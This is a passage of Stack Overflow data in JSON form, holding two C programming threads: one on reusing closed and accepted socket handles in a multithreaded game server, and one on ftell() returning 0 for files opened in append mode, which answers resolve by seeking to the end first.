"https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 1, "creation_date": 1461776795, "post_id": 36896352, "comment_id": 61356942, "body": "I do not understand why are you trying to reuse a closed socket."}, {"owner": {"reputation": 10901, "user_id": 1076479, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/eLQUX.jpg?s=128&g=1", "display_name": "Gil Hamilton", "link": "https://stackoverflow.com/users/1076479/gil-hamilton"}, "edited": false, "score": 0, "creation_date": 1461777866, "post_id": 36896352, "comment_id": 61357689, "body": "Your question really doesn&#39;t make sense. Post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461779865, "post_id": 36896352, "comment_id": 61358998, "body": "Additionally to providing an MCVE, it reads a bit like you mix up the <i>listen</i> sockets and the (accepted) connection sockets very much here. Please make a clear distinction here in your question."}, {"owner": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461783026, "post_id": 36896352, "comment_id": 61361021, "body": "Sorry for being bad at explaining, its been a loong day. I tried to make it more clear what the problem is, thanks for answering all of you."}, {"owner": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461784474, "post_id": 36896352, "comment_id": 61361915, "body": "well i have a socket called server that i do the socket and listen functions on, then i have sockets that i accept on"}, {"owner": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "edited": false, "score": 0, "creation_date": 1461809999, "post_id": 36896352, "comment_id": 61371977, "body": "@D.O. , one of my pet projects is <a href=\"https://github.com/boazsegev/c-server-tools\" rel=\"nofollow noreferrer\">a Linux/BSD framework for writing TCP servers in C</a>. If you wish to use it or collaborate (so that it supports your use-case), it could be great."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461786357, "post_id": 36898877, "comment_id": 61363108, "body": "Thank you david, this was a great read. You are right about me confusing sockets and socket handles. How ever the last sentance you wrote, you are telling me to do a close on the socket handle and i should be able to do accept on it again correct?"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461786425, "post_id": 36898877, "comment_id": 61363148, "body": "@D.O. No. I&#39;m telling you to <code>close</code> the socket handle that refers to the connected socket. This has no effect on the listening socket, so of course you can call <code>accept</code> on it again. Read the sentence that begins &quot;You can continue to call <code>accept</code>&quot; again."}, {"owner": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461787204, "post_id": 36898877, "comment_id": 61363656, "body": "Yeah thats what im doing i think, i never do close() on the integer i did socket() on, i only do close on what i accept, which is a socket handle? so say i do int server, client; socket(server),bind(server), listen(server), accept(client), close(client), accept(client) this should work in theory? because this is what i do basically and it gives me bad file descriptor"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461788171, "post_id": 36898877, "comment_id": 61364233, "body": "@D.O. No, that should not work. In your example, <code>server</code> is the listening socket and <code>client</code> is the connected socket. So you need to call <code>accept</code> on <code>server</code>, not <code>client</code>. You want <code>client=accept(server);</code>. You want to assign to <code>client</code> the descriptor for a socket that represents the connection you accepted on the listening socket <code>server</code>."}, {"owner": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461788382, "post_id": 36898877, "comment_id": 61364357, "body": "Oh yeah, this is actually exactly what ive done, still i get bad file descriptor.. maybe its a problem in my logic to see which socket handle is free and not.."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461792306, "post_id": 36898877, "comment_id": 61366475, "body": "If you are getting &quot;bad file descriptor&quot; when you call <code>accept</code>, you are passing <code>accept</code> a descriptor that you have <code>close</code>d somehow."}, {"owner": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "edited": false, "score": 0, "creation_date": 1461934153, "post_id": 36898877, "comment_id": 61436576, "body": "Alright I took a day of to clear my mind, the problem in the end was a thread problem. When i connected a player i updated which slot the next connected player would join, and when i disconnected i updated the same variable. Since the variable operations where in different threads, the main thread would loop around and wait for a connection to happend on the old next player socket handle, but when i got to handeling the connection i used the new player socket handle. So i did the recv on a random file descriptor, which caused the bad file descriptor error."}], "tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": true, "score": 6, "last_activity_date": 1461785435, "last_edit_date": 1461785435, "creation_date": 1461784346, "answer_id": 36898877, "question_id": 36896352, "link": "https://stackoverflow.com/questions/36896352/c-linux-reusing-a-closed-socket-alternatives/36898877#36898877", "title": "C &amp; linux: Reusing a closed socket/Alternatives", "body": "<p>You are confusing two different types of sockets.</p>\n\n<p>There are listening sockets. You make a socket into a listening socket when you call <code>listen</code>. You can then call <code>accept</code> on the listening socket to get connected sockets. The only time you would <code>close</code> a listening socket is if you don't want to listen for new connections any more (at least, not on that port). You would never call <code>send</code> or <code>recv</code> on a listening socket because they're not connected to anything.</p>\n\n<p>There are connected sockets. When you call <code>accept</code> on a listening socket, you get back a brand new connected socket. You can call <code>send</code> and <code>recv</code> on the connected socket to talk to the other end. When you're done with a connected socket, you should <code>close</code> it. Then the connected socket will be fully destroyed.</p>\n\n<p>You can continue to call <code>accept</code> on a listening socket to get more connected sockets as you call <code>send</code>, <code>recv</code>, and <code>close</code> on those connected sockets as you need to do that to manage your various connections.</p>\n\n<p>You may also be confusing sockets with socket handles. Sometimes people do use the term \"socket\" for both. But there is the socket itself, which is a communication endpoint that may or may not be connected and then there's the socket handle which is a number that is used to reference a specific socket.</p>\n\n<p>You cannot reuse the actual socket -- it's the endpoint of a dead connection. You can re-use the socket handle. Once you call <code>close</code>, regardless of what happens to the actual socket, the handle can be reused. Your next call to <code>socket</code> or <code>accept</code> may get back the same handle. (But don't assume it does, just store the handle.)</p>\n\n<blockquote>\n  <p>When a player joins they take the first available socket in the list and does accept() on it, when the client disconnects I want the socket to be available for another client to claim. basically I want the old client to let go with close() or something similiar and the new client who connects later to be able to reuse this socket/position in the array.</p>\n</blockquote>\n\n<p>The new client can reuse the socket handle and the position in the array. Call <code>accept</code> on your listening socket and store that new connected socket's handle in the vacant array slot.</p>\n\n<p>I'm assuming your first sentence is worded a bit badly. I suspect what you mean to say is something like: \"<em>For a player to join the server, a slot in the array is assigned. A thread calls <code>accept</code> on the server's listening socket and stores the returned socket descriptor in that slot in the array.</em>\"</p>\n\n<p>When you're done with a connection, <code>close</code> the connected socket and mark that slot in the array free. You can then call <code>accept</code> again on the listening socket, maybe get back the same socket descriptor, but either way store the new connected socket in that slot in the array and handle the new client.</p>\n"}], "owner": {"reputation": 33, "user_id": 5390751, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3580b981c5c41c1a32c5a2855254c77e?s=128&d=identicon&r=PG&f=1", "display_name": "D. O.", "link": "https://stackoverflow.com/users/5390751/d-o"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2308, "favorite_count": 0, "accepted_answer_id": 36898877, "answer_count": 1, "score": 0, "last_activity_date": 1461785435, "creation_date": 1461776621, "last_edit_date": 1461782973, "question_id": 36896352, "link": "https://stackoverflow.com/questions/36896352/c-linux-reusing-a-closed-socket-alternatives", "title": "C &amp; linux: Reusing a closed socket/Alternatives", "body": "<p>I'm making a multithreaded tcp server for a game.</p>\n\n<p>I'm having trouble with sockets, when the server stops recieving information from the client, I close that socket i did accept() (shown below) on and exit the thread and inform the main thread that the slot is not busy anymore.</p>\n\n<pre><code>clientData.client[next] ) = accept(server,(struct sockaddr *)&amp;client_address,&amp;t)); \n</code></pre>\n\n<p>(error check ommitted here but i do have it)</p>\n\n<p>However when I try to enter that slot again it gives me a bad file descriptor, I did some digging and found out that close() completely destroys a socket and renders it unusable for the rest of the run(please correct me if I'm wrong).</p>\n\n<p>Now what makes me confused is that:</p>\n\n<p>a) I can still use the socket to accept, and I get back a file descriptor, the problem is when i try to use recv() on the socket like this.</p>\n\n<pre><code>n = (recv(c-&gt;client[threadLocal], str, 100, 0); \n</code></pre>\n\n<p>(error check ommitted here but i do have it)</p>\n\n<p>b) I can reuse the socket fine and dandy when I get to the last slot in my socket array which is just weird, if its a problem the first runs but not the last i get the feeling I've miss understood something.</p>\n\n<p>c) How can i make a socket reusable? Or what is a good alternative to making sockets that can be reused for the rest of the program run.</p>\n\n<p>All help is GREATLY appriciated, because honestly im so confused about whats going on here.</p>\n\n<p>EDIT: Okay so a small example of what im trying to do. I have an array of sockets in a struct which represent slots on the server. I realised it would probably have been easier to do a list of structs that represent players that contain a socket, so you can make a new struct when someone joins but i'd rather not right now because that would require a lot of work, but if there is no option i will do it.</p>\n\n<pre><code>struct clientData{\n int clientSocket[maxplayers];\n //and some other stuff\n};\n</code></pre>\n\n<p>When a player joins they take the first available socket in the list and does accept() on it, when the client disconnects I want the socket to be available for another client to claim. basically I want the old client to let go with close() or something similiar and the new client who connects later to be able to reuse this socket/position in the array.</p>\n\n<p>Im looking for a way to reset a socket so it can be used again when needed.\nI hope this made things more understandable, thanks again.</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 3612, "user_id": 1813336, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zONI.jpg?s=128&g=1", "display_name": "cleblanc", "link": "https://stackoverflow.com/users/1813336/cleblanc"}, "edited": false, "score": 0, "creation_date": 1461776536, "post_id": 36896230, "comment_id": 61356775, "body": "does ftell return a long or a 64.  How is user1 defined?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 3612, "user_id": 1813336, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zONI.jpg?s=128&g=1", "display_name": "cleblanc", "link": "https://stackoverflow.com/users/1813336/cleblanc"}, "edited": false, "score": 0, "creation_date": 1461776925, "post_id": 36896230, "comment_id": 61357029, "body": "@cleblanc  <code>long int ftell(FILE *stream)</code>"}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461777077, "post_id": 36896230, "comment_id": 61357134, "body": "typedef struct {       long recid;       char dataid[5];              /* USER1 */       ..     } user1_type;"}, {"owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1461777606, "post_id": 36896230, "comment_id": 61357493, "body": "From the docs for ftell() that I use: &quot;Note that when a file is opened for appending data, the current file position is determined by the last I/O operation, not by where the next write would occur.&quot;  You must call fseek() first."}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461786136, "post_id": 36896230, "comment_id": 61362965, "body": "apparently on some implementations the file pos for a+b is set at EOF without a seek being needed (FreeBSD)"}], "answers": [{"comments": [{"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1461776981, "post_id": 36896355, "comment_id": 61357073, "body": "I don&#39;t see such behavior under gcc 4.9.3/cygwin. Can you provide supporting documentation?"}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461777125, "post_id": 36896355, "comment_id": 61357162, "body": "This has been working in the past, but the code was moved into a virtualized environment.. would that cause any change?"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1461777356, "post_id": 36896355, "comment_id": 61357328, "body": "@R-Sahu: &quot;<i>Note that when a file is opened for appending data, the current file position is determined by the last I/O operation, not by where the next write would occur.</i>&quot; (MS VC2008)"}, {"owner": {"reputation": 2174, "user_id": 5398184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe5626580b435c284cf0605e15f32?s=128&d=identicon&r=PG", "display_name": "Biruk Abebe", "link": "https://stackoverflow.com/users/5398184/biruk-abebe"}, "edited": false, "score": 0, "creation_date": 1461777447, "post_id": 36896355, "comment_id": 61357387, "body": "@R Sahu This behaviors is for MSVC. I am not sure about gcc. i&#39;ll try to look into it."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1461777519, "post_id": 36896355, "comment_id": 61357436, "body": "@bkVnet, thanks for adding the clarification and the supporting documentation."}, {"owner": {"reputation": 2174, "user_id": 5398184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe5626580b435c284cf0605e15f32?s=128&d=identicon&r=PG", "display_name": "Biruk Abebe", "link": "https://stackoverflow.com/users/5398184/biruk-abebe"}, "reply_to_user": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 1, "creation_date": 1461777906, "post_id": 36896355, "comment_id": 61357710, "body": "@Trent Three As mentioned in the comment by R Sahu, this behavior may be implementation dependent(i&#39;m not sure), the behavior i provide in the answer comes from MSDN documentation of ftell, but again you can use fseek() to seek to the end of file before using ftell"}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461782912, "post_id": 36896355, "comment_id": 61360934, "body": "This explains things.... I had numerous c-based programs running under FreeBSD... they all broke when I migrated them to virtualized CentOS7.  I need to know what I need to do to make this legacy code work properly.. I am finding that seek and/or appends aren&#39;t behaving the same."}, {"owner": {"reputation": 2174, "user_id": 5398184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe5626580b435c284cf0605e15f32?s=128&d=identicon&r=PG", "display_name": "Biruk Abebe", "link": "https://stackoverflow.com/users/5398184/biruk-abebe"}, "reply_to_user": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461785282, "post_id": 36896355, "comment_id": 61362447, "body": "@TrentThree you can use <code>fseek(dfile,0,SEEK_END)</code> to position the pointer to the end before calling <code>ftell()</code>. This should not interfere with further calls to write data to the file."}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461786291, "post_id": 36896355, "comment_id": 61363067, "body": "I was storing the record number in the file, and I was getting it by ftell() prior to appending, so I was storing invalid data in the file when I migrated to a different OS"}], "tags": [], "owner": {"reputation": 2174, "user_id": 5398184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe5626580b435c284cf0605e15f32?s=128&d=identicon&r=PG", "display_name": "Biruk Abebe", "link": "https://stackoverflow.com/users/5398184/biruk-abebe"}, "is_accepted": false, "score": 3, "last_activity_date": 1461777454, "last_edit_date": 1461777454, "creation_date": 1461776627, "answer_id": 36896355, "question_id": 36896230, "link": "https://stackoverflow.com/questions/36896230/problems-getting-ftell-in-binary-append/36896355#36896355", "title": "Problems getting ftell() in binary append", "body": "<p>From MSDN's documentation of <a href=\"https://msdn.microsoft.com/en-us/library/0ys3hc0b.aspx\" rel=\"nofollow\"><code>ftell</code></a></p>\n\n<blockquote>\n  <p>The position returned by <code>ftell()</code> is expressed as an offset relative\n  to the beginning of the stream</p>\n  \n  <p>If no I/O operation has yet occurred on a file opened for appending,\n  the file position is the beginning of the file.</p>\n</blockquote>\n\n<p>This gives you an offset of 0 relative to the beginning.</p>\n\n<p>So when you call <code>user1.recid=ftell(dfile);</code> no I/O operation has occurred on the stream yet so <code>ftell()</code> returns 0 indicating the file pointer position is at the begining.</p>\n"}, {"comments": [{"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461783593, "post_id": 36896524, "comment_id": 61361367, "body": "I think you may be correct sir!  Here&#39;s what I think is happening.. on my previous FreeBSD implementation, when a file is opened for append, the position is already moved to the end of the file, so ftell() works in one way, but under CentOS, you have to add     fseek(dfile,0,SEEK_END);  in order to get ftell() to give you something other than 0!"}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461783707, "post_id": 36896524, "comment_id": 61361441, "body": "I believe my code problems are the result of getting invalid record number references when appending."}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461785194, "post_id": 36896524, "comment_id": 61362395, "body": "will a fread() change the position of ftell() or is that implementation dependent and I may need to also do a seek?"}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461786432, "post_id": 36896524, "comment_id": 61363153, "body": "also does a fseek need to be done if a text file is opened a la fopen(filename,&quot;at&quot;); ?"}], "tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": true, "score": 2, "last_activity_date": 1461777127, "creation_date": 1461777127, "answer_id": 36896524, "question_id": 36896230, "link": "https://stackoverflow.com/questions/36896230/problems-getting-ftell-in-binary-append/36896524#36896524", "title": "Problems getting ftell() in binary append", "body": "<p>...so (in addition to bkVnet's answer) you must use <code>fseek(dfile,0,SEEK_END)</code> to seek to the end, ask <code>ftell</code> the position and divide that by <code>sizeof(user1_type)</code> to get the record id (i.e. the number of records already in the file, so plus 1 for the new record).</p>\n"}, {"comments": [{"owner": {"reputation": 2174, "user_id": 5398184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe5626580b435c284cf0605e15f32?s=128&d=identicon&r=PG", "display_name": "Biruk Abebe", "link": "https://stackoverflow.com/users/5398184/biruk-abebe"}, "edited": false, "score": 0, "creation_date": 1461778043, "post_id": 36896819, "comment_id": 61357803, "body": "Thanks for the clarification. I suspected i could be implementation defined."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461778106, "post_id": 36896819, "comment_id": 61357846, "body": "Nicely explain OP&#39;s &quot;code that was working on a server until it was moved to a different system&quot;"}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461782737, "post_id": 36896819, "comment_id": 61360824, "body": "WOW thanks... ok, I&#39;ve got to figure this out... what&#39;s happening is I need to know the file position before I do the write."}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461782773, "post_id": 36896819, "comment_id": 61360852, "body": "I was using FreeBSD and ftell() returned something different on that implementation.. now under CentOS, it works differently... do I need to open the file with a different mode/command?"}, {"owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 0, "creation_date": 1461783779, "post_id": 36896819, "comment_id": 61361484, "body": "I believe Paul Ogilvie has the right answer- a manual seek has to be executed before getting the position, the need for which may be implementation different.. I&#39;m testing this right now"}, {"owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "reply_to_user": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "edited": false, "score": 1, "creation_date": 1461784613, "post_id": 36896819, "comment_id": 61362001, "body": "@TrentThree: I don&#39;t think you need to worry about different implementations - just do the <code>fseek(dfile,0,SEEK_END)</code> regardless.  If the file pointer is already positioned there, it&#39;s effectively a no-op, and for implementations that start with the file pointer at the beginning it will give you the behavior that you need.  If you open the file in append mode, a write will <i>always</i> seek to the end of the file before performing the write."}], "tags": [], "owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "is_accepted": false, "score": 3, "last_activity_date": 1461778069, "last_edit_date": 1461778069, "creation_date": 1461777990, "answer_id": 36896819, "question_id": 36896230, "link": "https://stackoverflow.com/questions/36896230/problems-getting-ftell-in-binary-append/36896819#36896819", "title": "Problems getting ftell() in binary append", "body": "<p>This behavior of <code>ftell(dfile)</code> here would be implementation defined. From C11 7.21.3 (similar wording in previous C standards):</p>\n\n<blockquote>\n  <p>If a file can support positioning requests (such as a disk file, as\n  opposed to a terminal), then a file position indicator associated with\n  the stream is positioned at the start (character number zero) of the\n  file, <strong>unless the file is opened with append mode in which case it is\n  implementation-defined</strong> whether the file position indicator is\n  initially positioned at the beginning or the end of the file.</p>\n</blockquote>\n"}], "owner": {"reputation": 83, "user_id": 4326181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8b2882df9ea455d4a47eba0092a8761d?s=128&d=identicon&r=PG&f=1", "display_name": "Trent Three", "link": "https://stackoverflow.com/users/4326181/trent-three"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 550, "favorite_count": 0, "accepted_answer_id": 36896524, "answer_count": 3, "score": 3, "last_activity_date": 1461786773, "creation_date": 1461776310, "last_edit_date": 1461786773, "question_id": 36896230, "link": "https://stackoverflow.com/questions/36896230/problems-getting-ftell-in-binary-append", "title": "Problems getting ftell() in binary append", "body": "<p>I've got some code that was working on a server until it was moved to a different system.  The problem seems to be here:</p>\n\n<p>given a structure I've defined elsewhere:</p>\n\n<pre><code>user1_type user1;              /* structure containing user data */\nuser1_type *user1_ptr=&amp;user1;\n</code></pre>\n\n<p>this routine appends the record to the end of the file</p>\n\n<pre><code>if ((dfile=fopen(filename,\"ab+\"))==NULL)  \n  error_message(\"Unable to open file for append.\",filename,1);\n else { /* append data */\n user1.recid=ftell(dfile);               /* update file position */\n\n fwrite(user1_ptr,sizeof(user1),1,dfile);\n fflush(dfile);\n fclose(dfile);\n</code></pre>\n\n<p>I can confirm the data gets appended in 